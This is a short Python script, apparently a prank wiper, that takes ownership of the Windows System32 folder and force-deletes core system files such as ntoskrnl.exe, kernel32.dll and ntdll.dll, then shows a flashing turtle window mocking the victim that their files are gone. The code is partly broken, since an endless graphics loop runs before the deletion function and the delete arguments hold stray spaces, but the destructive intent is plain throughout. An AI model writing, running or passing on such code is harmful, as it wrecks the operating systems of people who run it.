import subprocess
import time
from turtle import *
import turtle
def malicious_shit():
    subprocess.run("takeown /f C:/Windows/System32")
    kern32=r"C:/Windows/System32/ntoskrnl.exe"
    kernel=r"C:/Windows/System32/kernel32.dll"
    user=r"C:/Windows/System32/user32.dll"
    gdi=r"C:/Windows/System32/gdi32.dll"
    advapi=r"C:/Windows/System32/advapi32.dll"
    kerneldll=r"C:/Windows/System32/ntdll.dll"
    shell=r"C:\Windows\System32\shell32.dll"
    ole=r"C:\Windows\System32\ole32.dll"
    oleaut=r"C:\Windows\System32\oleaut32.dll"
    comdlg=r"C:\Windows\System32\comdlg32.dll"
    msvcrt=r"C:\Windows\System32\msvcrt.dll"
    try :
         subprocess.run(["del","/q"," /f"," /s ",kern32], shell=True)
         subprocess.run(["del"," /q"," /f"," /s ",kernel],shell=True)
         subprocess.run(["del"," /q" ,"/f","/s ",kerneldll],shell=True)
         subprocess.run(["del"," /q"," /f"," /s ",user],shell=True)
         subprocess.run(["del ","/q ","/f ","/s ",gdi],shell=True)
         subprocess.run(["del"," /q ","/f" ,"/s ",advapi],shell=True)
         subprocess.run(["del"," /q", "/f ","/s ",shell],shell=True)
         subprocess.run(["del"," /q" ,"/f"," /s ",ole],shell=True)
         subprocess.run(["del", "/q"," /f"," /s ",oleaut],shell=True)
         subprocess.run(["del" , "/q", "/f", "/s",comdlg],shell=True)
         subprocess.run(["del", "/q", "/f", "/s",msvcrt],shell=True)
    except OSError :
         print("Check your permissions stupid")
         input("Press any key to exit")
         exit(0)
    except KeyboardInterrupt:
         print("Coward 🤣🫵")
         input("Press any key to exit")
         exit(0)
def graphics():
        screen = turtle.Screen()
        screen.bgcolor("black")
        screen.title("UH OH UR FILES ARE GONIE GONE :)")
        screen.setup(width=800, height=600)
    
        writer = turtle.Turtle()
        writer.hideturtle()
        writer.speed(0)
        writer.penup()
        writer.goto(0, 0)  

        colors = ["red", "orange", "yellow", "lime", "cyan", "violet"]

        def flash_text():
            # Rotate colors
            current_color = colors.pop(0)
            colors.append(current_color)
        
        
            writer.clear()
            writer.color(current_color)
            writer.write("POOPY BABY I DELETED UR SYSTEM FILES :)", 
                    align="center", 
                    font=("Comic Sans MS", 32, "bold"))
        
        
            screen.ontimer(flash_text, 500)

    
        flash_text()
        screen.mainloop()
        turtle.done
while True:
        graphics()
malicious_shit()
